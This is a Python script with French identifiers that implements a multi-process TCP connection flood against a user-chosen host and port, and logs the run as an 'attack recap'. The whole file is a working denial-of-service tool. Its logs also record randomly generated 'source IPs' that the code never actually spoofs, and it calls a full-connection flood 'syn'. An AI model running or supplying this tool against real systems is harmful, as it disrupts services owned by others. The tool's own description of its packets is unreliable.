import socket
import threading
import multiprocessing
import time
from demande_user import DemandeUtilisateur
from journaltest import Journal
from ip_aleatoire import generer_ip_sources
from barre_de_progression import barre

from multiprocessing import Lock, Value

progress_lock = Lock()
total_paquets_envoyes = Value('i', 0)  

class EnvoiPaquet:
   
    def envois(cible, port, nbrpaquet, results):
        messages = []
        segment_size = nbrpaquet // 10
        paquets_envoyes = 0
        
        for i in range(nbrpaquet):
            ip_source = generer_ip_sources()
            message = f"Paquet envoyé - IP source: {ip_source}, Port: {port}, Destination: {cible}, Protocole: TCP"
            ip = socket.gethostbyname(cible)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            try:
                s.sendall(b"Data to send")
                messages.append(message)
                paquets_envoyes += 1
                with total_paquets_envoyes.get_lock():
                    total_paquets_envoyes.value += 1  # Incrémenter le nombre total de paquets envoyés
            except socket.error as e:
                print(e)
            finally:
                s.close()
            
            if paquets_envoyes % segment_size == 0:
                with progress_lock:
                    pourcentage_progression = (paquets_envoyes / nbrpaquet) * 100
                    print(f"On est à {pourcentage_progression:.0f}%", end="\r")
        
        results.extend(messages)

class Journalisation:

    
    def journaliser(cible, port, nbrpaquet, nbr_processus, messages):
        journal = Journal()
        journal.log_demande(cible, port, nbrpaquet, nbr_processus)
        journal.log_recap_attaque(cible, port, nbrpaquet, nbr_processus, messages)

def syn(cible, port, nbrpaquet, nbr_processus):
    debut_execution = time.time()
    packets_per_process = nbrpaquet // nbr_processus
    results = multiprocessing.Manager().list()
    processes = []

    for _ in range(nbr_processus):
        p = multiprocessing.Process(target=EnvoiPaquet.envois, args=(cible, port, packets_per_process, results))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()

    temps_execution = round(time.time() - debut_execution, 2)

    print(f"Temps d'exécution total : {temps_execution} secondes")
    print(f"Total de paquets envoyés : {total_paquets_envoyes.value}")
    Journalisation.journaliser(cible, port, nbrpaquet, nbr_processus, results)

if __name__ == "__main__":
    demande_utilisateur = DemandeUtilisateur()
    cible, port, nbrpaquet, nbr_processus = demande_utilisateur.obtenir_informations()
    syn(cible, port, nbrpaquet, nbr_processus)
